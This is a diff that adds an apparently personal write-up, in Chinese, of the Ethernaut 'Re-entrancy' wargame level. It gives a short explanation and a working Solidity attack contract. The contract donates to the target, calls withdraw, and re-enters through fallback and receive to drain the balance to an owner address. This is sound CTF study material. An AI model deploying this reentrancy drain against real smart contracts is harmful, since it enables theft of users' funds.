@@ -106,4 +106,38 @@ contract AttackKing {
 }
 ```
 
+### 2024.09.02
+#### Ethernaut - Re-entrancy
+合约地址：0x84841B92767187f235B67690Db1179f7E6307faC
+可以对 withdraw 使用重入攻击
+需要特别注意，重入攻击不能放在 constructor 中。因为在创建合约时，fallback/receive函数内容可能还没有被初始化，会是空的
+```
+contract AttackReentracy {
+    address payable public  _reentracy;
+    address payable public _owner;
+
+    constructor( address payable reentracy, address payable owner) public payable {
+        _reentracy = reentracy;
+        _owner = owner;
+    }
+
+    function withdraw() external payable {
+        // 1. 往目标合约捐款
+        Reentrance(_reentracy).donate{value: 0.001 ether}(address(this));
+        // 2. 调用目标合约取款
+        Reentrance(_reentracy).withdraw(1000000000000000);
+        // 3. 给owner转账
+        payable(_owner).transfer(address(this).balance);
+    }
+
+    fallback() external payable { 
+        Reentrance(_reentracy).withdraw(1000000000000000);
+    }
+
+    receive() external payable {
+        Reentrance(_reentracy).withdraw(1000000000000000);
+    }
+}
+```
+
 <!-- Content_END -->
